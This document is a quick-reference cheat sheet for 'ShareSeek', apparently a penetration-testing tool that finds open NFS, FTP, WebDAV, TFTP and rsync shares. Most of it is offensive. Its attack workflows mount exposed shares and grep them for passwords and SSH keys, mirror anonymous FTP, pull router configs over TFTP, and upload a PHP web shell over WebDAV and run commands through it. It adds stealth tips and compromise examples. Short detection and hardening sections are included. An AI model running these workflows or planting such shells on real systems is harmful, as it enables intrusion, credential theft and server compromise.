# ShareSeek Quick Reference

## Quick Start

```bash
# Basic scan
./shareseek.py

# Verbose output
./shareseek.py -v

# Fast scan
./shareseek.py -w 20

# Custom targets
./shareseek.py -f servers.txt
```

## Common Commands

### Discovery
```bash
# Scan all share types
./shareseek.py

# Show all hosts (including negative results)
./shareseek.py -v

# Specific network
echo "192.168.1.0/24" > targets.txt
./shareseek.py -f targets.txt
```

### Performance
```bash
# Fast scan (20 workers)
./shareseek.py -w 20

# Slow/careful scan
./shareseek.py -w 5 --timeout 10

# Timeout adjustment
./shareseek.py --timeout 5
```

## Share Protocols

### NFS (Port 2049)
```bash
# Scan for NFS
./shareseek.py

# Manual check
showmount -e 192.168.1.51

# Mount share
mount -t nfs 192.168.1.51:/data /mnt/data

# List mounted
df -h -t nfs

# Unmount
umount /mnt/data
```

### FTP (Port 21)
```bash
# Connect
ftp 192.168.1.50

# Anonymous login
Username: anonymous
Password: (blank or anonymous@)

# Better client (lftp)
lftp ftp://192.168.1.50

# Mirror entire site
lftp> mirror -c /
```

### WebDAV (Ports 80, 443, 8080)
```bash
# Test for WebDAV
curl -X OPTIONS http://192.168.1.53/webdav

# Mount (Linux with davfs2)
mount -t davfs http://192.168.1.53/webdav /mnt/webdav

# Windows
net use Z: http://192.168.1.53/webdav

# Upload file
curl -X PUT http://192.168.1.53/webdav/file.txt -d "content"
```

### TFTP (Port 69 UDP)
```bash
# Download file
tftp 192.168.1.54
> get config.txt

# One-liner
tftp 192.168.1.54 -c get startup-config

# Common files to try
tftp 192.168.1.54 -c get running-config
tftp 192.168.1.54 -c get config.txt
```

### rsync (Port 873)
```bash
# List modules
rsync rsync://192.168.1.52/

# List contents
rsync rsync://192.168.1.52/files/

# Download file
rsync rsync://192.168.1.52/files/data.txt ./

# Download directory
rsync -av rsync://192.168.1.52/files/ ./files/
```

## Output Files

| File | Description |
|------|-------------|
| `sharelist.txt` | List of accessible shares |
| `share_details.txt` | Detailed findings |
| `share_details.json` | JSON export |

## Attack Workflows

### Workflow 1: Quick Enumeration
```bash
# 1. Fast discovery
./shareseek.py -w 20

# 2. Review shares
cat sharelist.txt

# 3. Test access
# Pick shares and mount/access them
```

### Workflow 2: NFS Data Extraction
```bash
# 1. Find NFS servers
./shareseek.py | grep NFS

# 2. Mount export
mount -t nfs 192.168.1.51:/data /mnt/data

# 3. Search for sensitive files
find /mnt/data -name "*.conf" -o -name "*.xml"
grep -ri "password" /mnt/data/

# 4. Extract SSH keys
find /mnt/data -name "id_rsa" -o -name "id_dsa"
```

### Workflow 3: Anonymous FTP
```bash
# 1. Find anonymous FTP
./shareseek.py | grep ANONYMOUS

# 2. Connect and download
lftp ftp://192.168.1.50
lftp> mirror -c /

# 3. Search downloaded data
grep -ri "password\|credential" ./ftp-mirror/
```

### Workflow 4: WebDAV Shell Upload
```bash
# 1. Find WebDAV
./shareseek.py | grep WebDAV

# 2. Test write access
curl -X PUT http://192.168.1.53/webdav/test.txt -d "test"

# 3. Upload shell
curl -X PUT http://192.168.1.53/webdav/shell.php \
    -d '<?php system($_GET["cmd"]); ?>'

# 4. Execute
curl http://192.168.1.53/webdav/shell.php?cmd=whoami
```

## Manual Commands

### NFS
```bash
# Show exports
showmount -e 192.168.1.51

# Mount with specific version
mount -t nfs -o vers=3 192.168.1.51:/data /mnt/data

# Check mount options
mount | grep nfs

# Force unmount
umount -f /mnt/data
```

### FTP
```bash
# Connect with specific user
ftp user@192.168.1.50

# Download recursively (wget)
wget -r ftp://anonymous:@192.168.1.50/

# Upload file
ftp> put file.txt
```

### WebDAV (cadaver)
```bash
# Install cadaver
sudo apt install cadaver

# Connect
cadaver http://192.168.1.53/webdav

# Commands
dav> ls
dav> get file.txt
dav> put file.txt
```

### rsync
```bash
# Test authentication
rsync --list-only rsync://user@192.168.1.52/files

# Bandwidth limit
rsync --bwlimit=1000 rsync://192.168.1.52/files/ ./

# Exclude patterns
rsync --exclude="*.log" rsync://192.168.1.52/files/ ./
```

## Integration Examples

### With Nmap
```bash
# 1. Port discovery
nmap -p 21,69,873,2049 192.168.1.0/24 -oG - | \
    grep "/open/" | cut -d' ' -f2 > share_hosts.txt

# 2. ShareSeek scan
./shareseek.py -f share_hosts.txt -v
```

### With Metasploit
```bash
msfconsole

# NFS enumeration
use auxiliary/scanner/nfs/nfsmount
set RHOSTS file:sharelist.txt
run

# FTP anonymous
use auxiliary/scanner/ftp/anonymous
set RHOSTS file:sharelist.txt
run
```

### With Custom Scripts
```bash
# Auto-mount all NFS shares
grep "://" sharelist.txt | while read share; do
    ip=$(echo $share | cut -d: -f1)
    path=$(echo $share | cut -d: -f2)
    mkdir -p /mnt/nfs_$ip
    mount -t nfs $share /mnt/nfs_$ip
done
```

## Common Options

```
Positional:
  None (uses iplist.txt)

Optional:
  -f, --file FILE     Input file (default: iplist.txt)
  -w, --workers N     Concurrent workers (default: 10)
  --timeout N         Connection timeout (default: 2)
  -v, --verbose       Show all hosts
```

## Detection Indicators

### Network
- Sequential connections to ports 21, 69, 873, 2049
- NFS showmount requests
- FTP anonymous login attempts
- WebDAV OPTIONS requests
- rsync list commands

### Logs
```bash
# NFS
grep "showmount" /var/log/syslog

# FTP
grep "anonymous" /var/log/vsftpd.log

# Apache (WebDAV)
grep "OPTIONS.*webdav" /var/log/apache2/access.log

# rsync
grep "list" /var/log/rsyncd.log
```

## Defense Quick Tips

### NFS Hardening
```bash
# /etc/exports - Restrict by network
/data 192.168.1.0/24(rw,root_squash,no_subtree_check)

# Apply
exportfs -ra

# Disable NFSv3
# /etc/nfs.conf
[nfsd]
vers3=no
vers4=yes
```

### FTP Hardening
```bash
# /etc/vsftpd.conf
anonymous_enable=NO
chroot_local_user=YES
write_enable=NO

systemctl restart vsftpd
```

### WebDAV Hardening
```apache
<Location /webdav>
    AuthType Basic
    AuthName "WebDAV"
    AuthUserFile /etc/apache2/.htpasswd
    Require valid-user
</Location>
```

### Firewall
```bash
# Restrict to internal only
iptables -A INPUT -p tcp --dport 21 -s 192.168.0.0/16 -j ACCEPT
iptables -A INPUT -p tcp --dport 21 -j DROP
iptables -A INPUT -p tcp --dport 2049 -s 192.168.0.0/16 -j ACCEPT
iptables -A INPUT -p tcp --dport 2049 -j DROP
```

## Troubleshooting

### Tool Not Found
```bash
# Install NFS tools
sudo apt install nfs-common

# Install rsync
sudo apt install rsync
```

### No Shares Found
```bash
# Manual verification
showmount -e 192.168.1.51
ftp 192.168.1.50
rsync rsync://192.168.1.52/

# Increase timeout
./shareseek.py --timeout 10
```

### Mount Failed
```bash
# Need root for mount
sudo mount -t nfs 192.168.1.51:/data /mnt/data

# Try different NFS version
mount -t nfs -o vers=3 192.168.1.51:/data /mnt/data

# Check exports allow your IP
showmount -e 192.168.1.51
```

## Tips & Tricks

### 🎯 Targeting
- Look for hostnames: fileserver, nas, storage, backup
- Legacy systems often have open shares
- Development environments frequently misconfigured
- Check backup windows for active file servers

### 🔍 Discovery
- DNS enumeration for file server names
- Port scan first to reduce target list
- Check network documentation
- Ask users where shared files are stored

### 🔒 Stealth
- Slow scans: `-w 5`
- Scan during backup windows (traffic cover)
- Share enumeration is normal network activity
- Use VPN to appear internal

### ⚡ Speed
- High workers: `-w 50`
- Pre-filter with Nmap
- Parallel instances for large networks
- Reduce timeout for fast networks

## One-Liners

```bash
# Quick discovery and mount all NFS
./shareseek.py && grep "://" sharelist.txt | while read s; do mount -t nfs $s /mnt/$(echo $s | tr ':/' '_'); done

# Find all anonymous FTP
./shareseek.py -v | grep ANONYMOUS | cut -d' ' -f2

# Auto-download from all FTP
cat sharelist.txt | grep "^ftp://" | while read url; do wget -r $url; done

# Extract IPs with shares
cat share_details.json | jq -r '.[] | select(.shares_found==true) | .ip'

# Count shares by type
cat share_details.json | jq -r '.[] | .services | keys[]' | sort | uniq -c
```

## Real-World Examples

### Example 1: Corporate Scan
```bash
./shareseek.py -f all_servers.txt -w 20
# Scanned: 500 servers
# Found: 15 NFS, 3 FTP, 2 WebDAV
# Result: Anonymous FTP with HR data
```

### Example 2: NFS Home Directories
```bash
./shareseek.py
# Found: 192.168.1.51:/home (*)
# Mounted: Found SSH keys for 50+ users
# Impact: Lateral movement across network
```

### Example 3: WebDAV Upload
```bash
./shareseek.py
# Found: http://192.168.1.53/webdav (PUT allowed)
# Uploaded: PHP web shell
# Result: Web server compromise
```

## Quick Reference Card

```
┌─────────────────────────────────────────────┐
│         SHARESEEK CHEAT SHEET               │
├─────────────────────────────────────────────┤
│ PROTOCOLS                                   │
│  NFS (2049)      Network File System        │
│  FTP (21)        File Transfer Protocol     │
│  WebDAV (80/443) Web file sharing           │
│  TFTP (69)       Trivial FTP (UDP)          │
│  rsync (873)     Sync protocol              │
├─────────────────────────────────────────────┤
│ MOUNTING                                    │
│  NFS:   mount -t nfs IP:/path /mnt          │
│  WebDAV: mount -t davfs http://IP /mnt      │
├─────────────────────────────────────────────┤
│ ANONYMOUS ACCESS                            │
│  FTP:   Username: anonymous, Pass: (blank)  │
│  NFS:   Export with * allows all            │
└─────────────────────────────────────────────┘
```

## Related Commands

```bash
# NFS
showmount -e IP
mount -t nfs IP:/path /mnt
exportfs -v

# FTP
ftp IP
lftp ftp://IP
wget -r ftp://anonymous:@IP/

# WebDAV
cadaver http://IP/webdav
curl -X OPTIONS http://IP/webdav

# TFTP
tftp IP
tftp IP -c get file

# rsync
rsync rsync://IP/
rsync -av rsync://IP/module/ ./
```

## Learning Resources

- **NFS**: RFC 1813, RFC 3530 (NFSv4)
- **FTP**: RFC 959
- **WebDAV**: RFC 4918
- **TFTP**: RFC 1350
- **rsync**: https://rsync.samba.org/
- **MITRE ATT&CK**: T1039 (Data from Network Shared Drive)
